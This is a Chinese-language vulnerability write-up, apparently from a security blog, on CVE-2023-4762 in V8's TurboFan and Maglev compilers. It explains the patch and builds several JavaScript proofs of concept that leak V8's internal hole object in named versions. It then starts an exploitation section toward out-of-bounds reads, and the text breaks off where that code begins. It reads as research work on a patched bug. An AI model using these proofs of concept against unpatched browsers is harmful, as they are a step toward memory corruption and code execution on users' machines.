<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CVE-2023-4762-漏洞POC编写分析与EXP编写</title>
  <link rel="stylesheet" href="https://stackedit.cn/style.css" />
</head>

<body class="stackedit">
    <a href="../index.html" style="position: fixed; top: 0; left: 2pt; text-align: center;text-decoration-line: none;color: black;font-size: 15px;">
		<img src="../img/home.png" width="15" height="15" alt="home">
		<span>HOME PAGE</span>
	</a>
  <div class="stackedit__html"><h2 id="目录"><span class="prefix"></span><span class="content">目录</span><span class="suffix"></span></h2>
<ul>
<li><strong><a href="./CVE-2023-4762-%E6%BC%8F%E6%B4%9EPOC%E7%BC%96%E5%86%99%E5%88%86%E6%9E%90%E4%B8%8EEXP%E7%BC%96%E5%86%99.html#patch">patch</a></strong></li>
<li><strong><a href="./CVE-2023-4762-%E6%BC%8F%E6%B4%9EPOC%E7%BC%96%E5%86%99%E5%88%86%E6%9E%90%E4%B8%8EEXP%E7%BC%96%E5%86%99.html#patch%E5%88%86%E6%9E%90">patch分析</a></strong></li>
<li><strong><a href="./CVE-2023-4762-%E6%BC%8F%E6%B4%9EPOC%E7%BC%96%E5%86%99%E5%88%86%E6%9E%90%E4%B8%8EEXP%E7%BC%96%E5%86%99.html#poc">poc</a></strong></li>
<li><strong><a href="./CVE-2023-4762-%E6%BC%8F%E6%B4%9EPOC%E7%BC%96%E5%86%99%E5%88%86%E6%9E%90%E4%B8%8EEXP%E7%BC%96%E5%86%99.html#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a></strong></li>
<li><strong><a href="./CVE-2023-4762-%E6%BC%8F%E6%B4%9EPOC%E7%BC%96%E5%86%99%E5%88%86%E6%9E%90%E4%B8%8EEXP%E7%BC%96%E5%86%99.html#%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93">问题总结</a></strong></li>
</ul>
<h2 id="patch"><span class="prefix"></span><span class="content">patch</span><span class="suffix"></span></h2>
<p><a href="https://chromium-review.googlesource.com/c/v8/v8/+/4817946">[turbofan] Growing a non-JSArray packed elements kind makes it holey (4817946) · Gerrit Code Review (googlesource.com)</a><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-18/6FL086hMRpNmdeaE.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-18/25jGL8YmfnGSiR9v.png" alt="输入图片说明"><br>
阅读patch说明基本可以知道此漏洞产生在Turbofan优化编译器<code>JSNativeContextSpecialization::BuildElementAccess</code>函数有关于非JSArray的packed elements优化处理中。当在js代码中存在对elements的访问操作时将会调用<code>JSNativeContextSpecialization::BuildElementAccess</code>函数来生成相应的处理节点。</p>
<h2 id="patch分析"><span class="prefix"></span><span class="content">patch分析</span><span class="suffix"></span></h2>
<p>此patch修改了两处，第一处(<a href="https://chromium-review.googlesource.com/c/v8/v8/+/4817946/4/src/compiler/js-native-context-specialization.cc#3466">…/js-native-context-specialization.cc </a>)会在Turbofan优化编译时被调用，此处会创建数组的约束节点：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-19/6gAdgtvxhljTU0oY.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-19/JR0xxW8lsxcrMFxT.png" alt="输入图片说明"><br>
此处的处理逻辑会根据element_kind判断当前的元素存储类型是否具有“空洞”(HOLEY)，根据是否存在空洞来创建不同的约束节点，在修补前无论有没有空洞都会创建NumberAdd节点作为约束节点，区别在于NumberAdd操作的基数与增量，对于存在空洞的elements会从JSArray的elements中获取长度并将此长度作为增长基数，增加最大间隙长度：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-19/T305mWRn19LQNTpE.png" alt="输入图片说明"><br>
对于不存在空洞的elements会根据receiver的类型来设定增长的基数，增量为1：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-19/kz4ex3GHxfHI86vf.png" alt="输入图片说明"><br>
第二处(<a href="https://chromium-review.googlesource.com/c/v8/v8/+/4817946/4/src/maglev/maglev-graph-builder.cc">…/maglev-graph-builder.cc)</a>)此处修补与上一处是一样的，无非就是在maglev引擎中也修补了同样的问题。<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-19/agXeWOE2p404Pka5.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-19/7vUzoYU3q6udAOtl.png" alt="输入图片说明"></p>
<h2 id="poc"><span class="prefix"></span><span class="content">poc</span><span class="suffix"></span></h2>
<p>首先需要尝试进入<code>JSNativeContextSpecialization::BuildElementAccess</code>函数，通过函数名及其函数的代码逻辑可以判断此函数会在产生elements访问时被出发调用，根据此特性可以编写出一个简单的js用例:</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token comment">// Load</span>
	<span class="token keyword">return</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>执行后会发现虽然进入了<code>JSNativeContextSpecialization::BuildElementAccess</code>函数但并没有执行到patch修改的代码块，阅读代码会发现要进入到被修改的代码块要先通过<code>IsGrowStoreMode</code>函数，想要让<code>IsGrowStoreMode</code>函数返回true只需要将Load操作改为Store并且是<code>STORE_AND_GROW_HANDLE_COW</code>操作：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-19/ESeVLN2rey5JQR9m.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-19/7dmIl2VYvMvpJauE.png" alt="输入图片说明"><br>
修改后：</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>但这明显无法触发漏洞，通过查看patch后的代码会发现新添加的代码逻辑增加了对receiver的判断，只有当receiver为JSArray时才会继续原本的逻辑，而当receiver不为JSArray时则直接返回elements_length，反过来讲此处修改就是为了防止非JSArray receiver去执行创建NumberAdd节点作为限制节点：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-20/K2AB5vM1I7eCMX6U.png" alt="输入图片说明"><br>
尝试使用非JSArray对象来尝试触发Elements访问，最常见的用arguments对象就可以：</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	arguments<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.2</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>直接使用此代码会发现只触发了<code>JSNativeContextSpecialization::ReducePropertyAccess</code>和<code>JSNativeContextSpecialization::ReduceElementAccess</code>函数，并没有触发<code>JSNativeContextSpecialization::BuildElementAccess</code>，阅读<code>JSNativeContextSpecialization::ReducePropertyAccess</code>函数源码发现想要触发<code>JSNativeContextSpecialization::BuildElementAccess</code>函数的调用首先需要满足access_infos列表中的元素个数大于等于1：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-20/dwQk2mDAJQWGYKT3.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-20/Z1BTXuV538NoEtE6.png" alt="输入图片说明"><br>
除此以外还要防止<code>ReducePropertyAccess</code>函数在调用到<code>BuildElementAccess</code>之前提前退出，上文得出的js代码会在检查转换组vector是否为空的分支处退出函数。<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-20/CXx59CL0ijleE1F0.png" alt="输入图片说明"><br>
通过查找<code>feedback.transition_groups_</code>的引用找到<code>AddGroup</code>函数此函数用于向<code>feedback.transition_groups_</code>添加元素：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-21/QTtadiZX5uvFceFF.png" alt="输入图片说明"><br>
只要确保在执行<code>ReducePropertyAccess</code>函数前执行<code>AddGroup</code>函数确保<code>feedback.transition_groups_</code>不为空。通过阅读调试源码以上文得出的js代码为例，想要调用<code>AddGroup</code>函数就必须保证func函数feedback列表中存在map，只有在反馈列表中存在map才会有对应的过渡对象。<br>
通过修改可以得到以下代码：</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	<span class="token keyword">return</span> arguments<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
  
<span class="token keyword">function</span> <span class="token function">store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>
	arr<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> args <span class="token operator">=</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
	<span class="token function">store</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>store<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>store<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">store</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>根据前面的分析可以知道想要完成漏洞的触发，需要满足：</p>
<ul>
<li>receiver不能为JSArray</li>
<li>elements_kind必须为<code>PACKED_*_ELEMENT</code></li>
<li>keyed_mode必须得是Store并且<code>store_mode</code>得是<code>STORE_AND_GROW_HANDLE_COW</code></li>
</ul>
<p>上面的代码由于会在FeedbackVector的slot中生成两个feedback元素内容，所以会调用两次<code>BuildElementAccess</code>函数，当第一次调用时会去处理<code>args['foo']=12</code>此时receiver为非JSArray符合要求，elements_kind为<code>PACKED_ELEMENT</code>也符合要求，但是<code>keyed_mode.store_mode</code>不为<code>STORE_AND_GROW_HANDLE_COW</code>不符合要求：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-10-25/QKUYacH7jGk4Vrmv.png" alt="输入图片说明"><br>
至此可以大致推断出此漏洞与CVE-2023-3079有相似之处，关于如何在FeedbackVector中构造一个map不为JSArray，<code>elements_kind</code>为<code>PCAKED_*_ELEMENT</code>，<code>store_mode</code>为<code>STORE_AND_GROW_HANDLE_COW</code>的feedback元素基本可以参考3079。<br>
在V8 Inline Cache机制中具有相同“形状”的对象将会调用相同的Builtin函数，而在<code>BuildElementAccess</code>函数中store与load操作的store_mode与Builtin函数有关，在以上JS用例代码中arguments对象<code>elements_kind</code>为<code>PCAKED_ELEMENT</code>并且arguments对象不为JSArray，但是store_mode为<code>STANDARD_STORE</code>，所以现在只需要让其store_mode为<code>STORE_AND_GROW_HANDLE_COW</code>。</p>
<p>结合以上分析我可以写出以下三个POC代码，其中前两个代码用例本质其实是一样的，只是单纯写法不一样，第三个在是在不同v8版本中写的，不需要obj对象只需要一个args对象即可，三个执行后都可以得到一个hole对象，POC1、POC2(v8 11.6.189.18)，POC3(v8 11.4.183.17)：</p>
<ul>
<li><strong>POC1</strong>：</li>
</ul>
<pre class=" language-js"><code class="prism  language-js"><span class="token comment">// v8 11.6.189.18</span>
<span class="token keyword">let</span> a1 <span class="token operator">=</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> a2 <span class="token operator">=</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> arguments<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">Store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>
    arr<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// KeyedStoreIC::Store</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token function">Store</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Store</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// TurboFan Optimize Compile</span>
<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>Store<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>Store<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Store</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> hole <span class="token operator">=</span> a2<span class="token punctuation">[</span>a2<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>hole<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul>
<li><strong>POC2</strong>:</li>
</ul>
<pre class=" language-js"><code class="prism  language-js"><span class="token comment">// v8 11.6.189.18</span>
<span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> args1 <span class="token operator">=</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> args2 <span class="token operator">=</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> arguments<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">Store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>
    arr<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">GetHole</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">Store</span><span class="token punctuation">(</span>args2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> args2<span class="token punctuation">[</span>args2<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// KeyedStoreIC::Store</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token function">Store</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Store</span><span class="token punctuation">(</span>args1<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">Store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// TurboFan Optimize Compile</span>
<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>Store<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>Store<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> hole <span class="token operator">=</span> <span class="token function">GetHole</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>hole<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul>
<li><strong>POC3</strong>：</li>
</ul>
<pre class=" language-js"><code class="prism  language-js"><span class="token comment">// v8 11.4.183.17</span>
<span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> args <span class="token operator">=</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">return</span> arguments<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">Store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>
    arr<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">GetHole</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">Store</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> args<span class="token punctuation">[</span>args<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// KeyedStoreIC::Store</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">Store</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">Store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// TurboFan Optimize Compile</span>
<span class="token operator">%</span><span class="token function">PrepareFunctionForOptimization</span><span class="token punctuation">(</span>Store<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">OptimizeFunctionOnNextCall</span><span class="token punctuation">(</span>Store<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> hole <span class="token operator">=</span> <span class="token function">GetHole</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>hole<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>为了方便之后的漏洞利用将其封装成一个函数，当然也可以直接用POC2或在11.4版本的v8上用POC3：</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">GetHole</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">function</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> arguments<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">function</span> <span class="token function">Store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> key<span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">{</span>
        arr<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> val<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> args1 <span class="token operator">=</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> args2 <span class="token operator">=</span> <span class="token function">GetArguments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token comment">// IC </span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token function">Store</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Store</span><span class="token punctuation">(</span>args1<span class="token punctuation">,</span> <span class="token string">"foo"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Optimize Compile</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">0x3000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
        <span class="token function">Store</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">Store</span><span class="token punctuation">(</span>args2<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> args2<span class="token punctuation">[</span>args2<span class="token punctuation">.</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">let</span> hole <span class="token operator">=</span> <span class="token function">GetHole</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>hole<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>之所以会有POC3通过分析后可知在11.4版本的v8中<code>args["foo"]=1</code>此类操作store_mode为<code>STORE_AND_GROW_HANDLE_COW</code>所以不需要在arguments对象之前再使用object对象来使其store_mode变为<code>STORE_AND_GROW_HANDLE_COW</code>：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-11-01/l3UchJJoBFkmkQAO.png" alt="输入图片说明"><br>
而在11.6版本中<code>args["foo"]=1</code>的store_mode为<code>STANDARD_STORE</code>，所以需要先使用object对象来使其store_mode变为<code>STORE_AND_GROW_HANDLE_COW</code>：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2023-11-01/jbaJElWVwvvbZyMr.png" alt="输入图片说明"></p>
<h2 id="漏洞利用"><span class="prefix"></span><span class="content">漏洞利用</span><span class="suffix"></span></h2>
<p>此时在js代码中通过调用<code>GetHole()</code>函数可以得到hole对象，通过参考3079的exp可知以下代码可以实现从arr1数组到arr2数组的越界读取：</p>
<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token punctuation">{</span>
